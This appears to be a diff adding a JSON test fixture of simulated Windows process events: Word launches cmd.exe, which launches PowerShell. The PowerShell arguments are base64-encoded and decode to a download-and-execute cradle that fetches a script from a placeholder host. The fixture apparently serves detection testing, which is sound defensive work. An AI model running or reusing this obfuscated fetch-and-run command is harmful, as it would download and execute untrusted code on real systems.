@@ -1,0 +1,87 @@
+[
+  {
+    "@timestamp": "2026-11-13T10:00:00Z",
+    "event": {
+      "id": "event-office",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ]
+    },
+    "host": {
+      "id": "lab-host",
+      "os": {
+        "type": "windows"
+      }
+    },
+    "process": {
+      "name": "winword.exe",
+      "entity_id": "office",
+      "pid": 1000
+    }
+  },
+  {
+    "@timestamp": "2026-11-13T10:00:01Z",
+    "event": {
+      "id": "event-cmd",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ]
+    },
+    "host": {
+      "id": "lab-host",
+      "os": {
+        "type": "windows"
+      }
+    },
+    "process": {
+      "name": "cmd.exe",
+      "entity_id": "cmd",
+      "pid": 2000,
+      "parent": {
+        "entity_id": "office",
+        "name": "winword.exe",
+        "pid": 1000
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-11-13T10:00:02Z",
+    "event": {
+      "id": "event-ps",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ]
+    },
+    "host": {
+      "id": "lab-host",
+      "os": {
+        "type": "windows"
+      }
+    },
+    "process": {
+      "name": "powershell.exe",
+      "entity_id": "ps",
+      "pid": 3000,
+      "parent": {
+        "entity_id": "cmd",
+        "name": "cmd.exe",
+        "pid": 2000
+      },
+      "args": [
+        "powershell.exe",
+        "-EncodedCommand",
+        "SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcABhAHkAbABvAGEAZAAuAGkAbgB2AGEAbABpAGQALwBkAGUAbQBvAC4AcABzADEAJwApACkA"
+      ],
+      "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcABhAHkAbABvAGEAZAAuAGkAbgB2AGEAbABpAGQALwBkAGUAbQBvAC4AcABzADEAJwApACkA"
+    }
+  }
+]
